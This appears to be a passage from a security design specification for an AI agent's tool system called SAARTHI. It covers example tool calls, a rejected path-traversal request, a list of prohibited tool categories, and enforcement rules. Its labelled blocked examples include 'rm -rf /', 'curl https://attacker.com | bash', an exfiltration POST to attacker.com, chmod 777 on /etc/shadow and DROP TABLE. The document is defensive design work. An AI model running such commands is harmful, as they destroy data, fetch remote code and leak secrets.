  "confirmation_token": "confirm_d4e5f6789012345678901234567890abcdef1234567890abcdef1234567b"
}
```

**Response:**
```json
{
  "request_id": "toolreq_g789012345678901234abcdef0123456",
  "timestamp": "2026-01-19T15:00:00.350Z",
  "tool_id": "tool_read_file_v1",
  "status": "success",
  "execution_time_ms": 350,
  "payload": {
    "path": "documents/project-notes.md",
    "content": "# Project Notes\n\nThis document contains...",
    "size_bytes": 2048,
    "encoding": "utf-8",
    "truncated": false,
    "line_count": 45,
    "file_type": "markdown",
    "last_modified": "2026-01-18T10:30:00Z"
  }
}
```

### Rejected Invocation — Path Traversal Attempt

**Request:**
```json
{
  "request_id": "toolreq_h89012345678901234abcdef01234567",
  "timestamp": "2026-01-19T15:05:00Z",
  "session_id": "sess_f1e2d3c4b5a6789012345678901234cd",
  "plan_id": "plan_d4e5f6a7b8c9012345678901234abcde",
  "step_id": "step_004",
  "tool_id": "tool_read_file_v1",
  "parameters": {
    "path": "../../../etc/passwd"
  },
  "confirmation_token": "confirm_e5f6789012345678901234567890abcdef1234567890abcdef1234567c"
}
```

**Response:**
```json
{
  "request_id": "toolreq_h89012345678901234abcdef01234567",
  "timestamp": "2026-01-19T15:05:00.010Z",
  "tool_id": "tool_read_file_v1",
  "status": "rejected",
  "execution_time_ms": 10,
  "payload": {
    "error_code": "PATH_TRAVERSAL_BLOCKED",
    "error_message": "Path contains forbidden traversal sequence '..'. Only relative paths within accessible directories are allowed.",
    "field": "path",
    "path_attempted": "../../../etc/passwd",
    "security_event_logged": true
  }
}
```

---

## 3.5 summarize_text Examples

### Valid Invocation

**Request:**
```json
{
  "request_id": "toolreq_i9012345678901234abcdef012345678",
  "timestamp": "2026-01-19T15:10:00Z",
  "session_id": "sess_f1e2d3c4b5a6789012345678901234cd",
  "plan_id": "plan_d4e5f6a7b8c9012345678901234abcde",
  "step_id": "step_005",
  "tool_id": "tool_summarize_text_v1",
  "parameters": {
    "text": "The global renewable energy sector has experienced unprecedented growth in 2025 and early 2026. Solar photovoltaic installations increased by 35% year-over-year, driven by declining costs and supportive government policies. Wind energy capacity additions reached 150 GW globally, with offshore wind projects accounting for a growing share of new installations. Battery storage deployments have also accelerated, with grid-scale projects becoming increasingly economical. Industry analysts project that renewable energy sources will account for over 40% of global electricity generation by the end of 2026, up from approximately 30% in 2023. Key challenges remain, including grid integration, supply chain constraints, and the need for continued policy support. However, the overall trajectory suggests that the energy transition is accelerating faster than many earlier projections anticipated.",
    "max_summary_length": 200,
    "style": "brief",
    "preserve_key_terms": true
  }
}
```

**Response:**
```json
{
  "request_id": "toolreq_i9012345678901234abcdef012345678",
  "timestamp": "2026-01-19T15:10:02.100Z",
  "tool_id": "tool_summarize_text_v1",
  "status": "success",
  "execution_time_ms": 2100,
  "payload": {
    "summary": "Global renewable energy grew significantly in 2025-2026, with solar PV up 35% and 150 GW of new wind capacity. Battery storage deployments accelerated. Renewables projected to reach 40% of global electricity by end of 2026.",
    "input_length": 892,
    "output_length": 198,
    "compression_ratio": 0.22,
    "style_used": "brief",
    "key_terms_extracted": [
      "renewable energy",
      "solar photovoltaic",
      "wind energy",
      "battery storage",
      "grid-scale",
      "energy transition"
    ],
    "processing_time_ms": 2100
  }
}
```

### Rejected Invocation — Text Too Short

**Request:**
```json
{
  "request_id": "toolreq_j012345678901234abcdef0123456789",
  "timestamp": "2026-01-19T15:15:00Z",
  "session_id": "sess_f1e2d3c4b5a6789012345678901234cd",
  "plan_id": "plan_d4e5f6a7b8c9012345678901234abcde",
  "step_id": "step_005",
  "tool_id": "tool_summarize_text_v1",
  "parameters": {
    "text": "Short text that is under 100 characters."
  }
}
```

**Response:**
```json
{
  "request_id": "toolreq_j012345678901234abcdef0123456789",
  "timestamp": "2026-01-19T15:15:00.015Z",
  "tool_id": "tool_summarize_text_v1",
  "status": "rejected",
  "execution_time_ms": 15,
  "payload": {
    "error_code": "TEXT_TOO_SHORT",
    "error_message": "Text must be at least 100 characters for meaningful summarization. Received: 41 characters.",
    "field": "text",
    "constraint": "minLength: 100",
    "received_length": 41
  }
}
```

---

# SECTION 4: PROHIBITED TOOLS

This section defines categories of tools that MUST NEVER be implemented in the SAARTHI tool system. These prohibitions are absolute and non-negotiable.

## 4.1 Prohibited Tool Categories

### 4.1.1 Arbitrary Code Execution

**Prohibition:** No tool may execute arbitrary code, scripts, or commands.

**Prohibited Capabilities:**
- `eval()` or equivalent in any language
- `exec()` or subprocess spawning with user-provided commands
- Dynamic function generation from strings
- Just-in-time compilation of user input
- Macro expansion with executable side effects

**Rationale:**
Arbitrary code execution allows an attacker or malfunctioning agent to bypass all other security controls. A single code execution vulnerability can compromise the entire system, exfiltrate data, or cause unbounded harm. Code execution cannot be safely sandboxed in a way that preserves usability while preventing all attacks.

**Example of What is Blocked:**
```
PROHIBITED: execute_code(language="python", code="import os; os.system('rm -rf /')")
PROHIBITED: run_script(script_path="/user/uploads/malicious.sh")
PROHIBITED: eval_expression(expr="__import__('os').popen('whoami').read()")
```

---

### 4.1.2 Shell and Command-Line Access

**Prohibition:** No tool may provide shell access or execute shell commands.

**Prohibited Capabilities:**
- Interactive shell sessions
- Single command execution via shell
- Piped or chained shell commands
- Environment variable manipulation
- Process management (spawn, kill, signal)

**Rationale:**
Shell access provides a superset of code execution capabilities, including file system access, network operations, process control, and system configuration. Even "limited" shell access is impossible to secure against determined attackers. Shell commands can be obfuscated, encoded, or constructed in ways that bypass input validation.

**Example of What is Blocked:**
```
PROHIBITED: shell_execute(command="ls -la")
PROHIBITED: run_command(cmd="curl https://attacker.com | bash")
PROHIBITED: terminal_session(shell="bash", interactive=true)
```

---

### 4.1.3 Unrestricted File System Writes

**Prohibition:** No tool may write to arbitrary file system locations.

**Prohibited Capabilities:**
- Write access outside designated sandbox directories
- File creation in system directories
- Modification of executable files
- Overwriting configuration files
- Creating symbolic links to sensitive locations
- Appending to log files in arbitrary locations

**Rationale:**
File system write access can be leveraged to:
- Overwrite critical system or application files
- Plant malicious executables or scripts
- Modify configuration to weaken security
- Corrupt data or cause denial of service
- Establish persistence for attackers

If file writes are ever needed, they must be:
- Limited to a specific, isolated sandbox directory
- Subject to strict filename and content validation
- Size-limited
- Audited at forensic level
- Require explicit user confirmation

**Example of What is Blocked:**
```
PROHIBITED: write_file(path="/etc/passwd", content="...")
PROHIBITED: create_file(path="../../system32/malware.exe", data="...")
PROHIBITED: append_log(path="/var/log/auth.log", message="...")
```

---

### 4.1.4 Unrestricted Network Access

**Prohibition:** No tool may make network requests to arbitrary endpoints.

**Prohibited Capabilities:**
- HTTP/HTTPS requests to user-specified URLs without allowlisting
- Raw socket connections
- DNS queries for arbitrary domains
- Email sending to arbitrary addresses
- Protocol handlers for arbitrary schemes
- VPN or tunnel creation

**Rationale:**
Unrestricted network access enables:
- Data exfiltration to attacker-controlled servers
- Server-side request forgery (SSRF) attacks
- Access to internal network services
- Participation in DDoS attacks
- Downloading malicious payloads
- Command-and-control communication

All network operations must:
- Use allowlisted endpoints only
- Be subject to rate limiting
- Be logged with full request/response capture
- Never expose raw network primitives

**Example of What is Blocked:**
```
PROHIBITED: http_request(url="https://attacker.com/exfil", method="POST", body=sensitive_data)
PROHIBITED: tcp_connect(host="192.168.1.1", port=22)
PROHIBITED: dns_lookup(domain="evil.com")
PROHIBITED: send_email(to="anyone@anywhere.com", body="...")
```

---

### 4.1.5 Self-Modifying Tools

**Prohibition:** No tool may modify its own definition, other tools, or the tool registry.

**Prohibited Capabilities:**
- Modifying tool schemas at runtime
- Adding new tools dynamically
- Removing or disabling existing tools
- Changing tool permissions or risk levels
- Updating handler references
- Modifying rate limits or confirmation requirements

**Rationale:**
Self-modification destroys the ability to audit and verify the system. If tools can modify themselves or each other:
- Security controls can be disabled
- Audit logs can be falsified
- Formal verification becomes impossible
- The system's behavior becomes unpredictable
- Privilege escalation becomes trivial

The tool registry must be immutable for the lifetime of the process.

**Example of What is Blocked:**
```
PROHIBITED: update_tool_schema(tool_id="tool_read_file_v1", new_schema={...})
PROHIBITED: register_tool(tool_definition={...})
PROHIBITED: disable_tool(tool_id="tool_open_url_v1")
PROHIBITED: set_confirmation_required(tool_id="tool_read_file_v1", required=false)
```

---

### 4.1.6 Credential and Secret Access

**Prohibition:** No tool may directly access, retrieve, or manage credentials or secrets.

**Prohibited Capabilities:**
- Reading password stores or keychains
- Accessing API keys or tokens
- Retrieving certificates or private keys
- Managing OAuth tokens
- Decrypting encrypted credentials
- Accessing session tokens

**Rationale:**
Credential access is the most direct path to system compromise. Credentials enable:
- Account takeover
- Lateral movement
- Privilege escalation
- Persistent access
- Identity impersonation

Any credential handling must occur outside the tool system, in a dedicated secrets management infrastructure with its own security controls.

**Example of What is Blocked:**
```
PROHIBITED: get_password(service="database", username="admin")
PROHIBITED: read_api_key(service="payment_gateway")
PROHIBITED: access_keychain(key_name="ssh_private_key")
PROHIBITED: get_oauth_token(provider="google", scope="all")
```

---

### 4.1.7 Database Direct Access

**Prohibition:** No tool may execute raw database queries or provide direct database access.

**Prohibited Capabilities:**
- Raw SQL execution
- NoSQL query execution with user-provided queries
- Database schema modification
- Database user management
- Database backup or restore operations
- Connection string or credential exposure

**Rationale:**
Direct database access enables:
- SQL injection attacks
- Data exfiltration at scale
- Data modification or destruction
- Privilege escalation via database-level permissions
- Exposure of sensitive data across authorization boundaries

Any data access must go through purpose-built, parameterized, audited APIs that enforce application-level authorization.

**Example of What is Blocked:**
```
PROHIBITED: execute_sql(query="SELECT * FROM users WHERE id = " + user_input)
PROHIBITED: run_query(database="production", sql="DROP TABLE users")
PROHIBITED: database_connect(connection_string="postgres://admin:password@prod-db/main")
```

---

### 4.1.8 System Configuration Modification

**Prohibition:** No tool may modify system, application, or security configuration.

**Prohibited Capabilities:**
- Modifying system settings
- Changing security policies
- Disabling logging or monitoring
- Modifying firewall rules
- Changing file permissions
- Installing or removing software

**Rationale:**
Configuration modification allows attackers to:
- Disable security controls
- Create backdoors
- Weaken encryption
- Disable auditing
- Escalate privileges
- Establish persistence

System configuration must be managed through dedicated, out-of-band configuration management with proper change control.

**Example of What is Blocked:**
```
PROHIBITED: set_system_config(key="security.audit.enabled", value=false)
PROHIBITED: modify_firewall(rule="allow all inbound")
PROHIBITED: install_package(package="netcat")
PROHIBITED: chmod(path="/etc/shadow", mode="777")
```

---

### 4.1.9 User Impersonation or Session Hijacking

**Prohibition:** No tool may impersonate users or manipulate sessions.

**Prohibited Capabilities:**
- Acting as a different user
- Creating sessions for other users
- Modifying session attributes
- Transferring sessions between users
- Extending session lifetimes arbitrarily
- Bypassing authentication

**Rationale:**
User impersonation breaks the fundamental security model. It enables:
- Unauthorized access to user data
- Actions attributed to wrong users
- Audit trail corruption
- Privacy violations
- Accountability destruction

All operations must execute in the context of the authenticated user with their permissions only.

**Example of What is Blocked:**
```
PROHIBITED: switch_user(target_user_id="admin")
PROHIBITED: create_session(user_id="victim", permissions=["all"])
PROHIBITED: impersonate(user="another_user", duration="1h")
```

---

### 4.1.10 Cryptographic Key Operations

**Prohibition:** No tool may generate, export, or manipulate cryptographic keys.

**Prohibited Capabilities:**
- Key generation
- Key export or serialization
- Private key access
- Key rotation outside key management systems
- Algorithm selection or modification
- Bypassing cryptographic operations

**Rationale:**
Cryptographic operations are foundational to security. Improper key handling enables:
- Data decryption by unauthorized parties
- Signature forgery
- Man-in-the-middle attacks
- Authentication bypass
- Irrecoverable security compromise

All cryptographic operations must be delegated to purpose-built cryptographic services with proper key management.

**Example of What is Blocked:**
```
PROHIBITED: generate_key(algorithm="rsa", bits=2048)
PROHIBITED: export_private_key(key_id="signing_key")
PROHIBITED: decrypt_with_master_key(ciphertext="...")
```

---

## 4.2 Prohibited Tool Summary Table

| Category | Risk Level | Example Prohibition | Consequence if Allowed |
|----------|------------|---------------------|------------------------|
| Arbitrary Code Execution | CRITICAL | `eval(user_input)` | Complete system compromise |
| Shell Access | CRITICAL | `shell.execute(cmd)` | Unbounded system access |
| Unrestricted File Writes | CRITICAL | `write_file(any_path)` | System corruption, persistence |
| Unrestricted Network | HIGH | `http.get(any_url)` | Data exfiltration, SSRF |
| Self-Modifying Tools | CRITICAL | `update_registry()` | Security control bypass |
| Credential Access | CRITICAL | `get_password()` | Account takeover |
| Direct Database Access | HIGH | `execute_sql(raw_query)` | Data breach, injection |
| System Config Modification | CRITICAL | `set_config(security=off)` | Security degradation |
| User Impersonation | CRITICAL | `act_as(other_user)` | Authorization bypass |
| Cryptographic Key Ops | CRITICAL | `export_private_key()` | Cryptographic compromise |

---

## 4.3 Enforcement Mechanisms

### Static Analysis

All tool implementations MUST pass static analysis that detects:
- Import of prohibited modules (e.g., `subprocess`, `os.system`)
- Use of dynamic execution functions
- Network operations outside approved libraries
- File operations outside sandboxed paths

### Registry Integrity

The tool registry MUST be:
- Cryptographically signed at build time
- Verified before loading
- Immutable during runtime
- Audited for prohibited patterns

### Runtime Sandboxing

Tool execution environments MUST:
- Have no network access except through approved proxies
- Have no file system access except designated directories
- Have no ability to spawn processes
- Have resource limits enforced (CPU, memory, time)

### Audit and Alerting

Any attempt to invoke prohibited capabilities MUST:
- Be logged at forensic level
- Trigger immediate security alert
- Result in session termination
- Be reported for incident response

---

# APPENDIX A: TOOL SECURITY CHECKLIST

For each tool, the following checklist must be completed before registry inclusion:

| Check | Requirement | Verified |
|-------|-------------|----------|
| Schema Complete | Input and output schemas fully defined | ☐ |
| No Free-Form Input | All parameters are structured with validation | ☐ |
| No Dynamic Execution | Handler is static, no code generation | ☐ |
| Permission Defined | Required permissions explicitly listed | ☐ |
| Risk Level Assigned | Appropriate risk classification applied | ☐ |
| Confirmation Policy | Confirmation requirement matches risk level | ☐ |
| Rate Limits Set | Rate limits prevent abuse | ☐ |
| Timeout Defined | Maximum execution time specified | ☐ |
| Audit Level Set | Logging verbosity appropriate for sensitivity | ☐ |
| Error Handling | All errors return structured, safe responses | ☐ |
| No Side-Channel Leaks | Errors don't reveal sensitive information | ☐ |
| Resource Limits | Memory and compute limits enforced | ☐ |
| Static Analysis Passed | No prohibited patterns detected | ☐ |
| Security Review | Reviewed by security team | ☐ |
| Penetration Tested | Attempted bypass documented | ☐ |

---

# APPENDIX B: CONFIRMATION FLOW

For tools requiring user confirmation:

```
┌─────────────────────────────────────────────────────────────────┐
│                     TOOL INVOCATION                             │
│               (confirmation_required = true)                    │
└─────────────────────────────┬───────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                  GENERATE CONFIRMATION REQUEST                  │
│  • tool_id, parameters                                          │
│  • Human-readable description of action                         │
│  • Risk indicators                                              │
│  • Timeout for response                                         │
└─────────────────────────────┬───────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                    PRESENT TO USER                              │
│  "SAARTHI wants to: Open URL https://docs.example.com          │
│   in your browser.                                              │
│                                                                 │
│   [Allow]  [Deny]  [Allow Always for This Domain]"             │
└─────────────────────────────┬───────────────────────────────────┘
                              │
            ┌─────────────────┼─────────────────┐
            │                 │                 │
            ▼                 ▼                 ▼
     ┌──────────┐      ┌──────────┐      ┌──────────┐
     │  Allow   │      │   Deny   │      │ Timeout  │
     └────┬─────┘      └────┬─────┘      └────┬─────┘
          │                 │                 │
          ▼                 ▼                 ▼
   Generate Token     REJECT with       REJECT with
   Execute Tool       USER_DECLINED     CONFIRMATION_TIMEOUT
```

### Confirmation Token Requirements

| Requirement | Description |
|-------------|-------------|
| Single-use | Token valid for one invocation only |
| Time-limited | Token expires after 5 minutes |
| Scope-bound | Token valid only for specific tool + parameters |
| Session-bound | Token valid only for originating session |
| Cryptographically random | 256-bit entropy minimum |
| Tamper-evident | Signed by confirmation service |

---

# APPENDIX C: RATE LIMITING STRATEGY

### Per-Tool Limits

Each tool has independent rate limits to prevent abuse:

| Tool | Requests/Minute | Requests/Hour | Burst Allowed |
|------|-----------------|---------------|---------------|
| web_search | 10 | 100 | 5 |
| open_url | 5 | 30 | 2 |
| create_reminder | 5 | 50 | 3 |
| read_file | 10 | 100 | 5 |
| summarize_text | 20 | 200 | 10 |

### Global Session Limits

In addition to per-tool limits:

| Limit | Value |
|-------|-------|
| Total tool invocations per minute | 30 |
| Total tool invocations per hour | 300 |
| Concurrent tool executions | 3 |
| Failed attempts before cooldown | 10 |
| Cooldown duration | 5 minutes |

### Rate Limit Response

```json
{
  "status": "rejected",
  "payload": {
    "error_code": "RATE_LIMITED",
    "error_message": "Rate limit exceeded for tool_web_search_v1",
    "limit_type": "requests_per_minute",
    "limit_value": 10,
    "current_count": 10,
    "reset_at": "2026-01-19T15:01:00Z",
    "retry_after_seconds": 45
  }
}
```

---

**END OF DOCUMENT**
